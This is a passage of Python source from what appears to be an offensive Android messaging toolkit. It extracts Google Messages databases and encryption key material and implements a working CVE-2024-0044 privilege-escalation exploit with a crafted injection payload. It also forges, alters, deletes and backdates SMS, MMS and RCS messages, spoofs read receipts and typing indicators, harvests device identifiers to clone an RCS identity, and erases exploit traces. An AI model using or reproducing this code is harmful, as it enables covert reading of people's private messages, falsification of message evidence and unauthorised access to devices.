                # Pull database files
                files_pulled = []
                for suffix in ['', '-wal', '-shm', '-journal']:
                    fname = f'bugle_db{suffix}'
                    local_path = str(extract_dir / fname)
                    pull = self._run_adb(f'pull {staging}/{fname} {local_path}')
                    if 'bytes' in pull.lower() or os.path.exists(local_path):
                        files_pulled.append(fname)
                # Pull key material
                keys_dir = extract_dir / 'shared_prefs'
                keys_dir.mkdir(exist_ok=True)
                self._run_adb(f'pull {staging}/shared_prefs/ {keys_dir}/')
                files_dir = extract_dir / 'files'
                files_dir.mkdir(exist_ok=True)
                self._run_adb(f'pull {staging}/files/ {files_dir}/')
                # Count key files
                key_files = list(keys_dir.rglob('*')) if keys_dir.exists() else []
                # Cleanup
                self._shell(f'su -c "rm -rf {staging}"')
                if files_pulled:
                    return {
                        'ok': True, 'method': 'root',
                        'files': files_pulled,
                        'key_files': len(key_files),
                        'path': str(extract_dir),
                        'encrypted': True,
                        'message': f'Extracted {len(files_pulled)} DB files + {len(key_files)} key/config files via root. '
                                   f'Database is encrypted — use key material from shared_prefs/ to decrypt.',
                    }
        return {'ok': False, 'error': 'bugle_db not found via root'}

    def _extract_via_archon(self, extract_dir: Path) -> Dict[str, Any]:
        """Extract RCS data via Archon app relay.

        This is the preferred method because Archon queries the database from
        within the app context where it is already decrypted in memory.  The
        result is a JSON dump of decrypted messages, not the raw encrypted DB.
        """
        staging = '/sdcard/Download/autarch_extract'
        # Method A: Ask Archon to dump decrypted messages to JSON
        broadcast_dump = (
            'shell am broadcast -a com.darkhal.archon.DUMP_MESSAGES '
            f'--es output_dir {staging} '
            '--ez include_rcs true '
            '--ez include_sms true '
            '--ez include_mms true '
            'com.darkhal.archon'
        )
        result = self._run_adb(broadcast_dump)
        if 'Broadcast completed' in result:
            time.sleep(5)
            # Pull the decrypted JSON dump
            local_dump = str(extract_dir / 'messages_decrypted.json')
            pull = self._run_adb(f'pull {staging}/messages.json {local_dump}')
            if os.path.exists(local_dump) and os.path.getsize(local_dump) > 10:
                self._shell(f'rm -rf {staging}')
                return {
                    'ok': True, 'method': 'archon_decrypted',
                    'files': ['messages_decrypted.json'],
                    'path': str(extract_dir),
                    'encrypted': False,
                    'message': 'Extracted decrypted messages via Archon app relay (database queried from app context)',
                }

        # Method B: Fallback — ask Archon to copy raw DB + key material via Shizuku
        broadcast_raw = (
            'shell am broadcast -a com.darkhal.archon.EXTRACT_DB '
            '--es target_package com.google.android.apps.messaging '
            '--es database bugle_db '
            f'--es output_dir {staging} '
            '--ez include_keys true '
            'com.darkhal.archon'
        )
        result = self._run_adb(broadcast_raw)
        if 'Broadcast completed' not in result:
            return {'ok': False, 'error': 'Archon broadcast failed'}

        time.sleep(3)

        files_pulled = []
        for fname in ['bugle_db', 'bugle_db-wal', 'bugle_db-shm', 'encryption_key.bin', 'shared_prefs.tar']:
            local_path = str(extract_dir / fname)
            pull = self._run_adb(f'pull {staging}/{fname} {local_path}')
            if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
                files_pulled.append(fname)

        self._shell(f'rm -rf {staging}')

        if files_pulled:
            has_key = any('key' in f or 'prefs' in f for f in files_pulled)
            return {
                'ok': True, 'method': 'archon_raw',
                'files': files_pulled, 'path': str(extract_dir),
                'encrypted': True, 'has_key_material': has_key,
                'message': f'Extracted {len(files_pulled)} files via Archon/Shizuku. '
                           + ('Key material included.' if has_key else 'WARNING: No key material — DB is encrypted.'),
            }
        return {'ok': False, 'error': 'Archon extraction produced no files'}

    def _extract_via_adb_backup(self, extract_dir: Path) -> Dict[str, Any]:
        """Extract via adb backup (deprecated on Android 12+ but may work)."""
        backup_file = str(extract_dir / 'messaging.ab')
        # Try backing up Google Messages
        result = self._run_adb(
            f'backup -nocompress com.google.android.apps.messaging',
            timeout=60,
        )
        # Also try telephony provider
        result2 = self._run_adb(
            f'backup -nocompress com.android.providers.telephony',
            timeout=60,
        )
        # Check if backup file was created
        if os.path.exists(backup_file) and os.path.getsize(backup_file) > 100:
            return {
                'ok': True, 'method': 'adb_backup',
                'files': ['messaging.ab'], 'path': str(extract_dir),
                'message': 'ADB backup created (may require user confirmation on device)',
                'note': 'Use extract_ab_file() to parse the .ab backup',
            }
        return {'ok': False, 'error': 'ADB backup not supported or user denied on device'}

    def query_bugle_db(self, sql: str) -> Dict[str, Any]:
        """Run SQL query against a locally extracted bugle_db."""
        # Find the most recent extraction
        extractions = sorted(self._extracted_dir.iterdir(), reverse=True)
        db_path = None
        for ext_dir in extractions:
            candidate = ext_dir / 'bugle_db'
            if candidate.exists():
                db_path = candidate
                break
        if not db_path:
            return {'ok': False, 'error': 'No extracted bugle_db found. Run extract_bugle_db() first.'}
        try:
            conn = sqlite3.connect(str(db_path))
            conn.row_factory = sqlite3.Row
            cursor = conn.execute(sql)
            rows = [dict(r) for r in cursor.fetchall()]
            conn.close()
            return {'ok': True, 'rows': rows, 'count': len(rows), 'db_path': str(db_path)}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def extract_rcs_from_bugle(self) -> Dict[str, Any]:
        """Extract only RCS messages from bugle_db (message_protocol >= 2)."""
        sql = """
            SELECT m._id, m.conversation_id, m.sent_timestamp, m.received_timestamp,
                   m.message_protocol, m.message_status, m.read,
                   p.text AS body, p.content_type, p.uri AS attachment_uri,
                   c.name AS conversation_name, c.snippet_text,
                   ppl.normalized_destination AS phone_number,
                   ppl.full_name AS contact_name,
                   CASE WHEN ppl.sub_id = -2 THEN 'incoming' ELSE 'outgoing' END AS direction
            FROM messages m
            LEFT JOIN parts p ON m._id = p.message_id
            LEFT JOIN conversations c ON m.conversation_id = c._id
            LEFT JOIN conversation_participants cp ON cp.conversation_id = c._id
            LEFT JOIN participants ppl ON cp.participant_id = ppl._id
            WHERE m.message_protocol >= 2
            ORDER BY m.sent_timestamp DESC
        """
        return self.query_bugle_db(sql)

    def extract_conversations_from_bugle(self) -> Dict[str, Any]:
        """Full conversation export from bugle_db with all participants."""
        sql = """
            SELECT c._id, c.name, c.snippet_text, c.sort_timestamp,
                   c.last_read_timestamp, c.participant_count, c.archive_status,
                   GROUP_CONCAT(ppl.normalized_destination, '; ') AS participants,
                   GROUP_CONCAT(ppl.full_name, '; ') AS participant_names
            FROM conversations c
            LEFT JOIN conversation_participants cp ON c._id = cp.conversation_id
            LEFT JOIN participants ppl ON cp.participant_id = ppl._id
            GROUP BY c._id
            ORDER BY c.sort_timestamp DESC
        """
        return self.query_bugle_db(sql)

    def extract_message_edits(self) -> Dict[str, Any]:
        """Get RCS message edit history from bugle_db."""
        sql = """
            SELECT me.message_id, me.latest_message_id,
                   me.original_rcs_messages_id,
                   me.edited_at_timestamp_ms, me.received_at_timestamp_ms,
                   p.text AS current_text
            FROM message_edits me
            LEFT JOIN messages m ON me.latest_message_id = m._id
            LEFT JOIN parts p ON m._id = p.message_id
            ORDER BY me.edited_at_timestamp_ms DESC
        """
        return self.query_bugle_db(sql)

    def extract_all_from_bugle(self) -> Dict[str, Any]:
        """Complete extraction of all messages, conversations, and participants from bugle_db."""
        result = {}
        # Messages
        sql_msgs = """
            SELECT m._id, m.conversation_id, m.sent_timestamp, m.received_timestamp,
                   m.message_protocol, m.message_status, m.read, m.seen,
                   p.text AS body, p.content_type, p.uri AS attachment_uri,
                   CASE m.message_protocol
                       WHEN 0 THEN 'SMS' WHEN 1 THEN 'MMS' ELSE 'RCS'
                   END AS protocol_name
            FROM messages m
            LEFT JOIN parts p ON m._id = p.message_id
            ORDER BY m.sent_timestamp DESC
        """
        msgs = self.query_bugle_db(sql_msgs)
        result['messages'] = msgs.get('rows', []) if msgs.get('ok') else []

        # Conversations
        convos = self.extract_conversations_from_bugle()
        result['conversations'] = convos.get('rows', []) if convos.get('ok') else []

        # Participants
        sql_parts = "SELECT * FROM participants ORDER BY _id"
        parts = self.query_bugle_db(sql_parts)
        result['participants'] = parts.get('rows', []) if parts.get('ok') else []

        # Edits
        edits = self.extract_message_edits()
        result['edits'] = edits.get('rows', []) if edits.get('ok') else []

        result['ok'] = True
        result['total_messages'] = len(result['messages'])
        result['total_conversations'] = len(result['conversations'])
        result['total_participants'] = len(result['participants'])

        # Save to file
        export_path = self._exports_dir / f'bugle_full_export_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        with open(export_path, 'w') as f:
            json.dump(result, f, indent=2, default=str)
        result['export_path'] = str(export_path)
        return result

    # ══════════════════════════════════════════════════════════════════════
    # §6  CVE-2024-0044 EXPLOIT
    # ══════════════════════════════════════════════════════════════════════

    def check_cve_2024_0044(self) -> Dict[str, Any]:
        """Check if device is vulnerable to CVE-2024-0044 (run-as privilege escalation)."""
        patch_info = self.get_security_patch_level()
        result = {
            'cve': 'CVE-2024-0044',
            'description': RCS_CVES['CVE-2024-0044']['desc'],
            'android_version': patch_info.get('android_version', 'unknown'),
            'security_patch': patch_info.get('security_patch', 'unknown'),
            'vulnerable': patch_info.get('cve_2024_0044_vulnerable', False),
        }
        if result['vulnerable']:
            result['message'] = ('Device appears vulnerable. Android 12/13 with security patch '
                                 f'before 2024-10-01 (current: {result["security_patch"]})')
        else:
            result['message'] = 'Device does not appear vulnerable to CVE-2024-0044'
        return result

    def exploit_cve_2024_0044(self, target_package: str = 'com.google.android.apps.messaging') -> Dict[str, Any]:
        """Execute CVE-2024-0044 run-as privilege escalation.

        This exploits a newline injection in PackageInstallerService to forge
        a package entry, allowing run-as access to any app's private data.
        Only works on Android 12-13 with security patch before October 2024.
        """
        # Verify vulnerability
        cve = self.check_cve_2024_0044()
        if not cve.get('vulnerable'):
            return {'ok': False, 'error': 'Device not vulnerable to CVE-2024-0044', 'details': cve}

        # Step 1: Get target app UID
        uid_output = self._shell(f'pm list packages -U | grep {target_package}')
        if self._is_error(uid_output) or target_package not in uid_output:
            return {'ok': False, 'error': f'Package {target_package} not found'}

        uid_match = re.search(r'uid:(\d+)', uid_output)
        if not uid_match:
            return {'ok': False, 'error': 'Could not determine target UID'}
        target_uid = uid_match.group(1)

        # Step 2: Create a minimal APK to push (we need any valid APK)
        # Use an existing small APK from the device
        apk_path = self._shell(f'pm path {target_package}')
        if self._is_error(apk_path):
            return {'ok': False, 'error': 'Cannot find target APK path'}
        apk_path = apk_path.replace('package:', '').strip()

        # Copy to writable location
        self._shell('cp /system/app/BasicDreams/BasicDreams.apk /data/local/tmp/exploit_carrier.apk 2>/dev/null')
        # Fallback: use any small system apk
        if 'error' in self._shell('ls /data/local/tmp/exploit_carrier.apk').lower():
            # Try another approach — use settings apk
            self._shell('cp /system/priv-app/Settings/Settings.apk /data/local/tmp/exploit_carrier.apk 2>/dev/null')

        # Step 3: Craft the injection payload
        victim_name = f'autarch_victim_{int(time.time())}'
        payload = (
            f'@null\n'
            f'{victim_name} {target_uid} 1 /data/user/0 '
            f'default:targetSdkVersion=28 none 0 0 1 @null'
        )

        # Step 4: Install with injected payload
        install_result = self._shell(
            f'pm install -i "{payload}" /data/local/tmp/exploit_carrier.apk',
            timeout=15,
        )

        # Step 5: Verify access
        verify = self._shell(f'run-as {victim_name} id')
        if f'uid={target_uid}' in verify or 'u0_a' in verify:
            self._cve_exploit_active = True
            self._exploit_victim_name = victim_name
            return {
                'ok': True,
                'message': f'CVE-2024-0044 exploit successful. run-as {victim_name} has UID {target_uid}',
                'victim_name': victim_name,
                'target_uid': target_uid,
                'target_package': target_package,
                'verify': verify,
            }
        return {
            'ok': False,
            'error': 'Exploit attempt did not achieve expected UID',
            'install_result': install_result,
            'verify': verify,
        }

    def _extract_via_cve(self, extract_dir: Path) -> Dict[str, Any]:
        """Extract bugle_db using CVE-2024-0044 exploit."""
        if not self._cve_exploit_active:
            exploit = self.exploit_cve_2024_0044()
            if not exploit.get('ok'):
                return exploit

        victim = self._exploit_victim_name
        staging = '/data/local/tmp/autarch_cve_extract'
        self._shell(f'mkdir -p {staging}')
        self._shell(f'chmod 777 {staging}')

        # Use run-as to access and copy databases
        for suffix in ['', '-wal', '-shm', '-journal']:
            fname = f'bugle_db{suffix}'
            for db_base in BUGLE_DB_PATHS:
                src = f'{db_base}{suffix}'
                self._shell(
                    f'run-as {victim} sh -c "cat {src}" > {staging}/{fname} 2>/dev/null'
                )

        # Pull extracted files
        files_pulled = []
        for suffix in ['', '-wal', '-shm', '-journal']:
            fname = f'bugle_db{suffix}'
            local_path = str(extract_dir / fname)
            pull = self._run_adb(f'pull {staging}/{fname} {local_path}')
            if os.path.exists(local_path) and os.path.getsize(local_path) > 0:
                files_pulled.append(fname)

        # Cleanup
        self._shell(f'rm -rf {staging}')

        if files_pulled:
            return {
                'ok': True, 'method': 'cve-2024-0044',
                'files': files_pulled, 'path': str(extract_dir),
                'message': f'Extracted {len(files_pulled)} files via CVE-2024-0044',
            }
        return {'ok': False, 'error': 'CVE extract produced no files'}

    def cleanup_cve_exploit(self) -> Dict[str, Any]:
        """Remove traces of CVE-2024-0044 exploit."""
        results = []
        if self._exploit_victim_name:
            # Uninstall the forged package
            out = self._shell(f'pm uninstall {self._exploit_victim_name}')
            results.append(f'Uninstall {self._exploit_victim_name}: {out}')
        # Remove staging files
        self._shell('rm -f /data/local/tmp/exploit_carrier.apk')
        self._shell('rm -rf /data/local/tmp/autarch_cve_extract')
        self._cve_exploit_active = False
        self._exploit_victim_name = None
        return {'ok': True, 'cleanup': results}

    # ══════════════════════════════════════════════════════════════════════
    # §7  MESSAGE FORGING
    # ══════════════════════════════════════════════════════════════════════

    def forge_sms(self, address: str, body: str, msg_type: int = MSG_TYPE_INBOX,
                  timestamp: Optional[int] = None, contact_name: Optional[str] = None,
                  read: int = 1) -> Dict[str, Any]:
        if not address or not body:
            return {'ok': False, 'error': 'Address and body are required'}
        ts = timestamp or self._ts_ms()
        bindings = {
            'address': address,
            'body': body,
            'type': msg_type,
            'date': ts,
            'date_sent': ts,
            'read': read,
            'seen': 1,
        }
        result = self._content_insert(SMS_URI, bindings)
        if self._is_error(result):
            return {'ok': False, 'error': result}
        entry = {
            'address': address, 'body': body, 'type': msg_type,
            'timestamp': ts, 'contact_name': contact_name,
            'action': 'forge_sms', 'time': datetime.now().isoformat(),
        }
        self._forged_log.append(entry)
        return {'ok': True, 'message': 'SMS forged successfully', 'details': entry}

    def forge_mms(self, address: str, subject: str = '', body: str = '',
                  msg_box: int = MMS_BOX_INBOX, timestamp: Optional[int] = None) -> Dict[str, Any]:
        if not address:
            return {'ok': False, 'error': 'Address required'}
        ts = timestamp or int(time.time())
        bindings = {
            'msg_box': msg_box,
            'date': ts,
            'read': 1,
            'seen': 1,
        }
        if subject:
            bindings['sub'] = subject
        result = self._content_insert(MMS_URI, bindings)
        if self._is_error(result):
            return {'ok': False, 'error': result}
        entry = {
            'address': address, 'subject': subject, 'body': body,
            'action': 'forge_mms', 'time': datetime.now().isoformat(),
        }
        self._forged_log.append(entry)
        return {'ok': True, 'message': 'MMS forged', 'details': entry}

    def forge_rcs(self, address: str, body: str, msg_type: int = MSG_TYPE_INBOX,
                  timestamp: Optional[int] = None) -> Dict[str, Any]:
        """Forge an RCS message.

        Attempts content://rcs/ provider first, falls back to Archon relay
        for direct bugle_db insertion.
        """
        if not address or not body:
            return {'ok': False, 'error': 'Address and body required'}
        ts = timestamp or self._ts_ms()

        # Try AOSP RCS provider
        bindings = {
            'rcs_text': body,
            'origination_timestamp': ts,
        }
        result = self._content_insert(f'{RCS_P2P_THREAD_URI}/0/incoming_message', bindings)
        if not self._is_error(result) and 'SecurityException' not in result:
            entry = {
                'address': address, 'body': body, 'type': msg_type,
                'timestamp': ts, 'method': 'rcs_provider',
                'action': 'forge_rcs', 'time': datetime.now().isoformat(),
            }
            self._forged_log.append(entry)
            return {'ok': True, 'message': 'RCS message forged via provider', 'details': entry}

        # Fallback: Archon relay
        broadcast = (
            f'shell am broadcast -a com.darkhal.archon.FORGE_RCS '
            f'--es address "{address}" '
            f'--es body "{body}" '
            f'--ei type {msg_type} '
            f'--el timestamp {ts} '
            f'com.darkhal.archon'
        )
        result = self._run_adb(broadcast)
        method = 'archon' if 'Broadcast completed' in result else 'failed'
        entry = {
            'address': address, 'body': body, 'type': msg_type,
            'timestamp': ts, 'method': method,
            'action': 'forge_rcs', 'time': datetime.now().isoformat(),
        }
        self._forged_log.append(entry)
        if method == 'archon':
            return {'ok': True, 'message': 'RCS message forged via Archon', 'details': entry}
        return {'ok': False, 'error': 'RCS forging requires Archon app or elevated access'}

    def forge_conversation(self, address: str, messages: List[Dict],
                           contact_name: Optional[str] = None) -> Dict[str, Any]:
        if not address or not messages:
            return {'ok': False, 'error': 'Address and messages required'}
        results = []
        for msg in messages:
            body = msg.get('body', '')
            msg_type = int(msg.get('type', MSG_TYPE_INBOX))
            ts = msg.get('timestamp')
            if ts:
                ts = int(ts)
            r = self.forge_sms(address, body, msg_type, ts, contact_name)
            results.append(r)
        ok_count = sum(1 for r in results if r.get('ok'))
        return {
            'ok': ok_count > 0,
            'message': f'Forged {ok_count}/{len(messages)} messages',
            'results': results,
        }

    def bulk_forge(self, messages_list: List[Dict]) -> Dict[str, Any]:
        results = []
        for msg in messages_list:
            r = self.forge_sms(
                address=msg.get('address', ''),
                body=msg.get('body', ''),
                msg_type=int(msg.get('type', MSG_TYPE_INBOX)),
                timestamp=int(msg['timestamp']) if msg.get('timestamp') else None,
                contact_name=msg.get('contact_name'),
                read=int(msg.get('read', 1)),
            )
            results.append(r)
        ok_count = sum(1 for r in results if r.get('ok'))
        return {'ok': ok_count > 0, 'forged': ok_count, 'total': len(messages_list)}

    def import_sms_backup_xml(self, xml_content: str) -> Dict[str, Any]:
        """Import SMS from SMS Backup & Restore XML format."""
        try:
            root = ET.fromstring(xml_content)
        except ET.ParseError as e:
            return {'ok': False, 'error': f'Invalid XML: {e}'}
        count = 0
        errors = []
        for sms_elem in root.findall('.//sms'):
            address = sms_elem.get('address', '')
            body = sms_elem.get('body', '')
            msg_type = int(sms_elem.get('type', '1'))
            date = sms_elem.get('date')
            read = int(sms_elem.get('read', '1'))
            if not address:
                continue
            ts = int(date) if date else None
            result = self.forge_sms(address, body, msg_type, ts, read=read)
            if result.get('ok'):
                count += 1
            else:
                errors.append(result.get('error', 'unknown'))
        return {
            'ok': count > 0,
            'imported': count,
            'errors': len(errors),
            'error_details': errors[:10],
        }

    # ══════════════════════════════════════════════════════════════════════
    # §8  MESSAGE MODIFICATION
    # ══════════════════════════════════════════════════════════════════════

    def modify_message(self, msg_id: int, new_body: Optional[str] = None,
                       new_timestamp: Optional[int] = None, new_type: Optional[int] = None,
                       new_read: Optional[int] = None) -> Dict[str, Any]:
        bindings = {}
        if new_body is not None:
            bindings['body'] = new_body
        if new_timestamp is not None:
            bindings['date'] = new_timestamp
        if new_type is not None:
            bindings['type'] = new_type
        if new_read is not None:
            bindings['read'] = new_read
        if not bindings:
            return {'ok': False, 'error': 'No modifications specified'}
        result = self._content_update(f'{SMS_URI}{msg_id}', bindings)
        if self._is_error(result):
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': f'Message {msg_id} modified', 'changes': bindings}

    def delete_message(self, msg_id: int) -> Dict[str, Any]:
        result = self._content_delete(f'{SMS_URI}{msg_id}')
        if self._is_error(result):
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': f'Message {msg_id} deleted'}

    def delete_conversation(self, thread_id: int) -> Dict[str, Any]:
        result = self._content_delete(SMS_URI, where=f'thread_id={thread_id}')
        if self._is_error(result):
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': f'Thread {thread_id} deleted'}

    def change_sender(self, msg_id: int, new_address: str) -> Dict[str, Any]:
        result = self._content_update(f'{SMS_URI}{msg_id}', {'address': new_address})
        if self._is_error(result):
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': f'Message {msg_id} sender changed to {new_address}'}

    def shift_timestamps(self, address: str, offset_minutes: int) -> Dict[str, Any]:
        safe_addr = address.replace("'", "''")
        msgs = self._content_query(SMS_URI, projection='_id:date',
                                   where=f"address='{safe_addr}'")
        modified = 0
        offset_ms = offset_minutes * 60 * 1000
        for msg in msgs:
            msg_id = msg.get('_id')
            old_date = msg.get('date')
            if msg_id and old_date:
                new_date = int(old_date) + offset_ms
                r = self._content_update(f'{SMS_URI}{msg_id}', {'date': new_date})
                if not self._is_error(r):
                    modified += 1
        return {'ok': modified > 0, 'modified': modified, 'total': len(msgs)}

    def mark_all_read(self, thread_id: Optional[int] = None) -> Dict[str, Any]:
        where = f'thread_id={thread_id} AND read=0' if thread_id else 'read=0'
        result = self._content_update(SMS_URI, {'read': 1}, where=where)
        if self._is_error(result):
            return {'ok': False, 'error': result}
        return {'ok': True, 'message': 'Messages marked as read'}

    def wipe_thread(self, thread_id: int) -> Dict[str, Any]:
        # Delete from both SMS and MMS
        r1 = self._content_delete(SMS_URI, where=f'thread_id={thread_id}')
        r2 = self._content_delete(MMS_URI, where=f'thread_id={thread_id}')
        return {'ok': True, 'sms_result': r1, 'mms_result': r2,
                'message': f'Thread {thread_id} wiped'}

    # ══════════════════════════════════════════════════════════════════════
    # §9  RCS EXPLOITATION
    # ══════════════════════════════════════════════════════════════════════

    def read_rcs_features(self, address: str) -> Dict[str, Any]:
        """Check RCS capabilities for a phone number."""
        # Try dumpsys for RCS capability info
        output = self._shell(f'dumpsys telephony_ims')
        features = {'address': address, 'rcs_capable': False, 'features': []}
        if output and not self._is_error(output):
            if address in output:
                features['rcs_capable'] = True
            # Parse UCE capabilities
            for line in output.splitlines():
                if 'capability' in line.lower() or 'uce' in line.lower():
                    features['features'].append(line.strip())
        # Also try Archon query
        broadcast = (
            f'shell am broadcast -a com.darkhal.archon.CHECK_RCS_CAPABLE '
            f'--es address "{address}" com.darkhal.archon'
        )
        self._run_adb(broadcast)
        return {'ok': True, **features}

    def spoof_rcs_read_receipt(self, msg_id: str) -> Dict[str, Any]:
        """Spoof a read receipt for an RCS message."""
        # Via content provider update
        result = self._content_update(
            f'content://rcs/p2p_thread/0/incoming_message/{msg_id}',
            {'seen_timestamp': self._ts_ms()},
        )
        if not self._is_error(result) and 'SecurityException' not in result:
            return {'ok': True, 'message': f'Read receipt spoofed for message {msg_id}'}
        # Fallback: Archon
        broadcast = (
            f'shell am broadcast -a com.darkhal.archon.SPOOF_READ_RECEIPT '
            f'--es msg_id "{msg_id}" com.darkhal.archon'
        )
        r = self._run_adb(broadcast)
        return {
            'ok': 'Broadcast completed' in r,
            'message': 'Read receipt spoof attempted via Archon',
        }

    def spoof_rcs_typing(self, address: str) -> Dict[str, Any]:
        """Send a fake typing indicator via Archon."""
        broadcast = (
            f'shell am broadcast -a com.darkhal.archon.SPOOF_TYPING '
            f'--es address "{address}" com.darkhal.archon'
        )
        r = self._run_adb(broadcast)
        return {
            'ok': 'Broadcast completed' in r,
            'message': f'Typing indicator spoofed to {address}',
        }

    def enumerate_rcs_providers(self) -> Dict[str, Any]:
        """Discover all accessible messaging content providers on the device."""
        return self.enumerate_providers()

    def clone_rcs_identity(self) -> Dict[str, Any]:
        """Extract RCS registration/identity data for cloning."""
        identity = {}
        # Get IMSI/ICCID
        identity['imei'] = self._shell('service call iphonesubinfo 1 | grep -o "[0-9a-f]\\{8\\}" | tail -n+2 | head -4')
        identity['phone_number'] = self._shell('service call iphonesubinfo 15 | grep -o "[0-9a-f]\\{8\\}" | tail -n+2 | head -4')
        # Get RCS provisioning state
        for pkg in MESSAGING_PACKAGES:
            sp_dir = f'/data/data/{pkg}/shared_prefs/'
            files = self._shell(f'run-as {self._exploit_victim_name} ls {sp_dir} 2>/dev/null') \
                if self._cve_exploit_active else ''
            if files and not self._is_error(files):
                identity[f'{pkg}_shared_prefs'] = files.splitlines()
        # Get SIM info
        identity['sim_operator'] = self._shell('getprop gsm.sim.operator.alpha')
        identity['sim_country'] = self._shell('getprop gsm.sim.operator.iso-country')
        identity['network_type'] = self._shell('getprop gsm.network.type')
        return {'ok': True, 'identity': identity}

    def extract_rcs_media(self, msg_id: str) -> Dict[str, Any]:
        """Extract media files from RCS messages."""
        # Check MMS parts for media
        parts = self._content_query(
            f'content://mms/{msg_id}/part',
            projection='_id:mid:ct:_data:name',
        )
        media_files = []
        for part in parts:
            ct = part.get('ct', '')
            if ct and ct != 'text/plain' and ct != 'application/smil':
                data_path = part.get('_data', '')
                if data_path:
                    # Pull the file
                    local_name = f"media_{msg_id}_{part.get('_id', 'unknown')}"
                    ext = ct.split('/')[-1] if '/' in ct else 'bin'
                    local_path = str(self._exports_dir / f'{local_name}.{ext}')
                    pull = self._run_adb(f'pull {data_path} {local_path}')
                    if os.path.exists(local_path):
                        media_files.append({
                            'content_type': ct,
                            'local_path': local_path,
                            'device_path': data_path,
                            'name': part.get('name', ''),
                        })
        return {'ok': True, 'media': media_files, 'count': len(media_files)}

    def intercept_archival_broadcast(self) -> Dict[str, Any]:
        """Set up interception of GOOGLE_MESSAGES_ARCHIVAL_UPDATE broadcasts.

        This is the enterprise archival broadcast that Google Messages sends
        when messages are sent, received, edited, or deleted on managed devices.
        """
        # Register a broadcast receiver via Archon
        broadcast = (
            'shell am broadcast -a com.darkhal.archon.REGISTER_ARCHIVAL_LISTENER '
            'com.darkhal.archon'
        )
        r = self._run_adb(broadcast)
        info = {
            'broadcast_action': ARCHIVAL_BROADCAST_ACTION,
            'uri_extra_key': ARCHIVAL_URI_EXTRA,
            'note': 'Requires fully managed device with Google Messages as default SMS app',
            'requirement': 'MCM config: messages_archival = com.darkhal.archon',
        }
        return {
            'ok': 'Broadcast completed' in r,
            'message': 'Archival listener registration attempted',
            'info': info,
        }

    def extract_signal_protocol_state(self) -> Dict[str, Any]:
        """Extract E2EE Signal Protocol session state (requires elevated access)."""
        if not self._cve_exploit_active:
            return {
                'ok': False,
                'error': 'Requires CVE-2024-0044 exploit or root access',
                'note': 'Signal Protocol keys are in '
                        '/data/data/com.google.android.apps.messaging/files/ '
                        'but master key is in Android Keystore (hardware-backed, not extractable via ADB)',
            }
        victim = self._exploit_victim_name
        # List files in the messaging app's files directory
        files = self._shell(
            f'run-as {victim} ls -la /data/data/com.google.android.apps.messaging/files/'
        )
        # List shared_prefs
        prefs = self._shell(
            f'run-as {victim} ls -la /data/data/com.google.android.apps.messaging/shared_prefs/'
        )
        return {
            'ok': True,
            'files_dir': files.splitlines() if files and not self._is_error(files) else [],
            'shared_prefs': prefs.splitlines() if prefs and not self._is_error(prefs) else [],
            'note': 'Session keys found but master encryption key is hardware-backed in Android Keystore',
        }

    def get_rcs_cve_database(self) -> Dict[str, Any]:
        """Return known CVEs affecting RCS/Android messaging."""
        return {'ok': True, 'cves': RCS_CVES, 'count': len(RCS_CVES)}

    # ══════════════════════════════════════════════════════════════════════
    # §10  DATABASE BACKUP & CLONE
    # ══════════════════════════════════════════════════════════════════════

    def full_backup(self, fmt: str = 'json') -> Dict[str, Any]:
        """Complete SMS/MMS/RCS backup."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # Get SMS
        sms = self.read_sms_database(limit=10000)
        # Get MMS
        mms = self.read_mms_database(limit=5000)
        # Get conversations
        convos = self.read_conversations(limit=1000)
        # Try RCS provider
        rcs = self.read_rcs_provider()

        backup = {
            'timestamp': timestamp,
            'device': self.get_device_info(),
            'sms': sms,
            'mms': mms,
            'conversations': convos,
            'rcs': rcs if rcs.get('ok') else {},
            'stats': {
                'sms_count': len(sms),
                'mms_count': len(mms),
                'conversation_count': len(convos),
            },
        }

        if fmt == 'xml':
            backup_path = self._backups_dir / f'backup_{timestamp}.xml'
            self._write_sms_backup_xml(sms, str(backup_path))
        else:
            backup_path = self._backups_dir / f'backup_{timestamp}.json'
            with open(backup_path, 'w') as f:
                json.dump(backup, f, indent=2, default=str)

        return {
            'ok': True,
            'path': str(backup_path),
            'stats': backup['stats'],
            'message': f'Backup saved to {backup_path}',
        }

    def _write_sms_backup_xml(self, messages: List[Dict], path: str):
        """Write SMS Backup & Restore compatible XML."""
        root = ET.Element('smses', count=str(len(messages)))
        for msg in messages:
            attrs = {
                'protocol': str(msg.get('protocol', '0') or '0'),
                'address': str(msg.get('address', '') or ''),
                'date': str(msg.get('date', '') or ''),
                'type': str(msg.get('type', '1') or '1'),
                'body': str(msg.get('body', '') or ''),
                'read': str(msg.get('read', '1') or '1'),
                'status': str(msg.get('status', '-1') or '-1'),
                'locked': str(msg.get('locked', '0') or '0'),
                'date_sent': str(msg.get('date_sent', '0') or '0'),
                'readable_date': str(msg.get('date_formatted', '') or ''),
                'contact_name': str(msg.get('contact_name', '(Unknown)') or '(Unknown)'),
            }
            ET.SubElement(root, 'sms', **attrs)
        tree = ET.ElementTree(root)
        ET.indent(tree, space='  ')
        tree.write(path, encoding='unicode', xml_declaration=True)

    def full_restore(self, backup_path: str) -> Dict[str, Any]:
        """Restore messages from a backup file."""
        path = Path(backup_path)
        if not path.exists():
            # Check in backups dir
            path = self._backups_dir / backup_path
        if not path.exists():
            return {'ok': False, 'error': f'Backup file not found: {backup_path}'}

        if path.suffix == '.xml':
            with open(path, 'r') as f:
                return self.import_sms_backup_xml(f.read())
        elif path.suffix == '.json':
            with open(path, 'r') as f:
                backup = json.load(f)
            sms = backup.get('sms', [])
            if not sms:
                return {'ok': False, 'error': 'No SMS messages in backup'}
            return self.bulk_forge(sms)
        return {'ok': False, 'error': f'Unsupported format: {path.suffix}'}

    def clone_to_device(self) -> Dict[str, Any]:
        """Clone all messages from current device backup to another device.

        Steps: 1) Run full_backup on source, 2) Connect target device,
        3) Run full_restore with the backup file.
        """
        backup = self.full_backup()
        if not backup.get('ok'):
            return backup
        return {
            'ok': True,
            'message': 'Backup created. Connect target device and call full_restore()',
            'backup_path': backup['path'],
            'stats': backup['stats'],
        }

    def export_messages(self, address: Optional[str] = None, fmt: str = 'json') -> Dict[str, Any]:
        """Export messages to JSON, CSV, or XML."""
        if address:
